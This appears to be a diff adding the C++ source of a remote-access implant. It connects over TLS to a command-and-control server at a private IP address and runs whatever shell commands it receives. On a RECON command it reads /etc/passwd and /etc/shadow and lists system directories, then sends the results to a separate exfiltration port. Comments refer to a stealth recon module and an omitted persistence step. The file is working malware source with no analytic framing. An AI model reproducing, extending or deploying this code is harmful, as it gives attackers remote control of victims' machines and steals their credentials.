@@ -1,0 +1,237 @@
+#include <cstdlib>
+#include <cstdio>
+#include <iostream>
+#include <sstream>
+#include <string>
+#include <vector>
+#include <memory>
+#include <array>
+#include <fstream>
+#include <filesystem>
+
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+
+// Include the reconnaissance module
+#include "recon.h"
+
+// Configuration (set via Makefile)
+#ifndef C2_IP
+#define C2_IP "10.37.1.249"
+#endif
+#ifndef C2_PORT
+#define C2_PORT 8888
+#endif
+#ifndef EXFIL_IP
+#define EXFIL_IP "10.37.1.249"
+#endif
+#ifndef EXFIL_PORT
+#define EXFIL_PORT 8889
+#endif
+
+// ----------------------------------------------------------------------
+// Simple command execution (used for CMD requests)
+// ----------------------------------------------------------------------
+static std::string exec_command(const std::string& cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
+    if (!pipe) return "Error: popen failed";
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+
+// ----------------------------------------------------------------------
+// Collect additional recon data: /etc/passwd, /etc/shadow, directory listing
+// ----------------------------------------------------------------------
+static std::string collect_sensitive_files() {
+    std::ostringstream out;
+    out << "\n=== SENSITIVE FILES ===\n";
+
+    // Read /etc/passwd
+    std::ifstream passwd("/etc/passwd");
+    if (passwd.is_open()) {
+        out << "\n--- /etc/passwd ---\n";
+        out << passwd.rdbuf();
+    } else {
+        out << "[!] Could not read /etc/passwd\n";
+    }
+
+    // Read /etc/shadow (may fail if not root)
+    std::ifstream shadow("/etc/shadow");
+    if (shadow.is_open()) {
+        out << "\n--- /etc/shadow ---\n";
+        out << shadow.rdbuf();
+    } else {
+        out << "[!] Could not read /etc/shadow (requires root)\n";
+    }
+
+    // Basic directory listings
+    out << "\n=== DIRECTORY LISTINGS ===\n";
+    const char* dirs[] = {"/", "/etc", "/var", "/tmp", "/home", nullptr};
+    for (int i = 0; dirs[i]; ++i) {
+        out << "\n--- " << dirs[i] << " ---\n";
+        out << exec_command("ls -la " + std::string(dirs[i]) + " 2>/dev/null");
+    }
+
+    return out.str();
+}
+
+// ----------------------------------------------------------------------
+// Reconnaissance handler (called when RECON command is received)
+// ----------------------------------------------------------------------
+static std::string run_full_recon() {
+    std::ostringstream report;
+
+    // Use the existing stealth recon module
+    report << perform_full_recon();
+
+    // Append additional file/directory data
+    report << collect_sensitive_files();
+
+    return report.str();
+}
+
+// ----------------------------------------------------------------------
+// TLS context and connection helpers (unchanged)
+// ----------------------------------------------------------------------
+static SSL_CTX* create_ssl_context() {
+    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
+    if (!ctx) {
+        ERR_print_errors_fp(stderr);
+        return nullptr;
+    }
+    if (SSL_CTX_load_verify_locations(ctx, "/tmp/index.html", nullptr) != 1) {
+        ERR_print_errors_fp(stderr);
+        SSL_CTX_free(ctx);
+        return nullptr;
+    }
+    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, nullptr);
+    return ctx;
+}
+
+static SSL* connect_tls(SSL_CTX* ctx, const char* ip, int port) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return nullptr;
+
+    struct sockaddr_in addr{};
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    inet_pton(AF_INET, ip, &addr.sin_addr);
+
+    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        close(sock);
+        return nullptr;
+    }
+
+    SSL* ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, sock);
+    SSL_set_tlsext_host_name(ssl, ip);
+
+    if (SSL_connect(ssl) != 1) {
+        ERR_print_errors_fp(stderr);
+        SSL_free(ssl);
+        close(sock);
+        return nullptr;
+    }
+    return ssl;
+}
+
+// ----------------------------------------------------------------------
+// Exfiltration helper (unchanged)
+// ----------------------------------------------------------------------
+static void exfiltrate(SSL* exfil_ssl, const std::string& data) {
+    if (!exfil_ssl) return;
+    SSL_write(exfil_ssl, data.c_str(), data.size());
+}
+
+// ----------------------------------------------------------------------
+// Handle incoming C2 messages (updated with RECON)
+// ----------------------------------------------------------------------
+static std::string handle_message(const std::string& msg, SSL* exfil_ssl) {
+    std::istringstream iss(msg);
+    std::string type, id, data;
+    if (!(iss >> type) || !(iss >> id)) {
+        return "ERR malformed";
+    }
+    std::getline(iss, data);
+    if (!data.empty() && data[0] == ' ') data.erase(0, 1);
+
+    std::string response;
+
+    if (type == "HELO") {
+        response = "HI " + id;
+        // Send initial recon on HELO
+        std::string recon = exec_command("uname -a; id; hostname");
+        exfiltrate(exfil_ssl, "=== INITIAL RECON ===\n" + recon + "\n=== END RECON ===\n");
+    }
+    else if (type == "CMD") {
+        std::string output = exec_command(data);
+        response = "OK " + id + " " + output;
+        exfiltrate(exfil_ssl, "CMD: " + data + "\n" + output + "\n---\n");
+    }
+    else if (type == "RECON") {
+        // Run full reconnaissance and send back
+        std::string recon_report = run_full_recon();
+        response = "OK " + id + " " + recon_report;
+        exfiltrate(exfil_ssl, "=== FULL RECON REPORT ===\n" + recon_report + "\n=== END ===\n");
+    }
+    else if (type == "EXIT") {
+        response = "OK " + id + " exiting";
+        throw std::runtime_error("EXIT");
+    }
+    else {
+        response = "ERR " + id + " unknown command";
+    }
+
+    return response;
+}
+
+// ----------------------------------------------------------------------
+// Main (unchanged except for adding RECON handler)
+// ----------------------------------------------------------------------
+int main() {
+    // Install persistence (as before, omitted for brevity)
+    // ...
+
+    SSL_library_init();
+    SSL_load_error_strings();
+    OpenSSL_add_all_algorithms();
+
+    SSL_CTX* ctx = create_ssl_context();
+    if (!ctx) return 1;
+
+    SSL* c2_ssl = connect_tls(ctx, C2_IP, C2_PORT);
+    if (!c2_ssl) {
+        SSL_CTX_free(ctx);
+        return 1;
+    }
+
+    SSL* exfil_ssl = connect_tls(ctx, EXFIL_IP, EXFIL_PORT);
+    // exfil_ssl may be null; that's okay
+
+    char buf[4096];
+    try {
+        while (true) {
+            int bytes = SSL_read(c2_ssl, buf, sizeof(buf) - 1);
+            if (bytes <= 0) break;
+            buf[bytes] = '\0';
+
+            std::string response = handle_message(std::string(buf), exfil_ssl);
+            SSL_write(c2_ssl, response.c_str(), response.size());
+        }
+    }
+    catch (...) {}
+
+    if (exfil_ssl) { SSL_shutdown(exfil_ssl); SSL_free(exfil_ssl); }
+    SSL_shutdown(c2_ssl);
+    SSL_free(c2_ssl);
+    SSL_CTX_free(ctx);
+    return 0;
+}
